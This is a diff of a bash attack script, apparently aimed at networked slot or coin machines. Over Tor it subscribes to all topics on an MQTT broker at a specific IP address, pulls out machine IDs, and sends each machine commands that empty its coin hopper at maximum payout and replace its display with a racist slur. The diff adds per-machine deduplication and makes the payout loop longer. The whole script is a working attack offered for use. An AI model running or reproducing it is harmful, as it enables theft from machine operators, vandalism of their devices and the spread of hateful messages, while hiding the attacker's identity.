@@ -1,33 +1,38 @@
 #!/bin/bash
-# LIVE SLOT KILLER - No files, pure stream DEFACE+MAX DROP
-BROKER="188.14.144.138" 
+# FIXED - Anti-duplicate LIVE SLOT KILLER + unique MAC tracking
+BROKER="188.14.144.138"
 PORT="1883"
 MSG='{"display":"TRUSTEDF57 CIAO NEGRO","neon":1,"permanent":true}'
+declare -A HIT_MACS  # Memory per MAC unique
 
-echo "[+] LIVE SLOT DESTROYER STARTED - Ctrl+C stop"
+echo "[+] LIVE UNIQUE SLOT DESTROYER - No duplicates"
 
-# PIPE live: sub -> grep MAC -> attack IMMEDIATE
 torsocks mosquitto_sub -h $BROKER -p $PORT -t '#' -v 2>/dev/null | \
 while IFS= read -r line; do
-  # Extract LIVE MACs on-the-fly
-  MAC=$(echo "$line" | grep -oE 'm/o/([0-9A-F]{20})' | cut -d'/' -f3)
+  MAC=$(echo "$line" | grep -oE 'm/o/([0-9A-F]{20})' | cut -d'/' -f3 | head -1)
+  
+  if [ -n "$MAC" ] && [ ${HIT_MACS[$MAC]+_} ]; then
+    # Skip già fatto
+    continue
+  fi
   
   if [ -n "$MAC" ]; then
-    echo "[+] LIVE HIT: $MAC - FULL ATTACK"
+    echo "[+] NEW TARGET: $MAC - FULL DESTROY"
+    HIT_MACS[$MAC]=1  # Mark as hit
     
-    # DEFACE PERMANENTE TUTTI SCHERMI
+    # DEFACE MASSICCIO
     torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/k/$MAC" -m "$MSG" &
     torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/display/$MAC" -m "$MSG" &
-    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m "{\"text\":\"TRUSTEDF57 CIAO NEGRO\"}" &
+    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m "{\"text\":\"TRUSTEDF57 CIAO NEGRO\",\"mode\":\"override\"}" &
     
-    # SVUOTA + MAX DROP MONETE (hopper max payout)
-    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m '{"cnt":0,"drop":"MAX","pay":"MAX"}' &
-    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/k/$MAC" -m '{"drop":true,"amount":"MAX"}' &
+    # SVUOTA + MAX COIN DROP
+    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m '{"credits":0,"drop":"MAXIMUM","hopper":"EMPTY"}' &
+    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/k/$MAC" -m '{"payout":"MAX","eject":true}' &
     
-    # DROP LOOP MAX senza flood
-    for i in {1..10}; do
-      torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m "{\"drop\":true,\"coins\":\"MAX\",\"cycle\":$i}" &
-      sleep 0.3
+    # DROP LOOP MAX POWER
+    for i in {1..15}; do
+      torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m "{\"drop\":\"MAX\",\"coins\":9999999,\"cycle\":$i}" &
+      sleep 0.2
     done
   fi
 done
